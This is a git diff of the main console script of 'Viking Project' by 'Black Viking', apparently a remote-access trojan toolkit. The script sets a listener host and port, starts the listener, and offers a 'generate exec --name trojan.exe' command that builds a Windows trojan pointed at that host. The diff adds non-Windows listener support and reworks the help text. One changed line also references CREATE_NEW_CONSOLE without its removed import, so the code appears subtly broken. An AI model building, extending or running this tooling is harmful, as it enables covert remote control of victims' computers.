@@ -8,10 +8,9 @@ __date__   = "16.04.2017"
 
 import os
 import sys
-from time import *
+import subprocess
 from colorama import init
 from colorama import Fore, Back, Style
-from subprocess import Popen, CREATE_NEW_CONSOLE
 
 reload(sys)
 sys.setdefaultencoding("utf-8")
@@ -42,7 +41,7 @@ def logo():
 \t[>]--->       Viking Project      <---[<]%s
 \t[>]--->        Version: 1.0       <---[<]
 \t[>]--->   github.com/blackvkng    <---[<]
-\t[>]--->       %sBlack Viking%s        <---[<]
+\t[>]--->        %sBlack Viking%s       <---[<]
 """%(Style.BRIGHT, red, Style.BRIGHT, Style.NORMAL, Style.BRIGHT, Style.NORMAL)
     print logo
     help()
@@ -53,27 +52,19 @@ def help():
 Commands:
     set HOST           : Set HOST value.
     set PORT           : Set PORT value.
-    settings           : Show HOST and PORT values.
+    show options       : Show HOST and PORT values.
     start listener     : Start Listener.
 
+    generate exec --name trojan.exe : Generating exe files.(Only on Windows with PyInstaller)
+
 Example:
-    >>> vkng => set HOST 127.0.0.1
-    >>> vkng => set PORT 8000
-    >>> vkng => show options
+    vkng => set HOST 127.0.0.1
+    vkng => set PORT 8000
+    vkng => show options
 [~] HOST: 127.0.0.1
 [~] PORT: 8000
 ===========================================================
-    >>> vkng => start listener / start / run
-
-#---- Generating exe files(Windows)
-
-    >>> vkng => set HOST 127.0.0.1
-    >>> vkng => set PORT 8000
-    >>> vkng => show options
-[~] HOST: 127.0.0.1
-[~] PORT: 8000
-===========================================================
-    >>> vkng => generate exec --name trojan.exe"""
+    vkng => start listener / start / run"""
     
 
 #-----------------   Main Function   -----------------#
@@ -98,19 +89,26 @@ def main():
 
         elif vkng == "start" or vkng == "run" or vkng == "start listener":
             if host != " " and port != " ":
-                Popen([sys.executable, 'source/listener.py', host, str(port)], creationflags=CREATE_NEW_CONSOLE)
+                if os.name == "nt":
+                    subprocess.Popen([sys.executable, 'source/listener.py', host, str(port)], creationflags=subprocess.CREATE_NEW_CONSOLE)
+                else:
+                    os.system(sys.executable + " source/listener.py %s %s"%(host, str(port)))
             else:
                 print "[~] Host: %s\n[~] Port: %s\n"%(host, port)+"="*60
 
         elif "generate exec --name" in vkng:
-            if host != " " and port != " ":
-                name = vkng.split()[-1]
-                if name != "":
-                    Popen([sys.executable, 'source/generate_exec.py', host, str(port), name], creationflags=CREATE_NEW_CONSOLE)
+            if os.name == "nt":
+                if host != " " and port != " ":
+                    name = vkng.split()[-1]
+                    if name != "":
+                        subprocess.Popen([sys.executable, 'source/generate_exec.py', host, str(port), name], creationflags=CREATE_NEW_CONSOLE)
+                    else:
+                        pass
                 else:
-                    pass
+                    print "[~] Host: %s\n[~] Port: %s\n"%(host, port)+"="*60
+
             else:
-                print "[~] Host: %s\n[~] Port: %s\n"%(host, port)+"="*60
+                print bright + yellow + "[*] This function only work on Windows!"
 
 
 
